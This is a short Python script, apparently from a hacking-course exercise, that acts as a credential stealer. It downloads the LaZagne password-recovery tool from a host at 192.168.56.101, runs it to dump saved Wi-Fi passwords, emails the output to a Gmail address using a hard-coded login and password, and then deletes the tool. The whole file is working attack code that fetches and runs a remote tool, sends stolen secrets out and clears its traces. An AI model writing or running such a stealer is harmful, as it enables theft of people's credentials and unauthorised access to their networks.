#!/usr/bin/env python 

import requests
import re
import smtplib
import subprocess
import os
import tempfile

def send_mail(email, password, message):
    # Instance of an SMTP server
    # The first arg is the smtp server name and the second arg is the port number
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password) 
    server.sendmail(email, email, message)
    server.quit()   

def download(url):
    get_response = requests.get(url)
    
    # Accessing the last element of the list (i.e actual file name)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

# Getting the temp directory
temp_directory = tempfile.gettempdir()

# Changing the working directory
os.chdir(temp_directory)
        
download("http://192.168.56.101/EvilFiles/lazagne.exe")
result = subprocess.check_output("lazagne.exe wifi", shell=True)
send_mail("proy9714@gmail.com", "gogeta9714", result)
os.remove("lazagne.exe")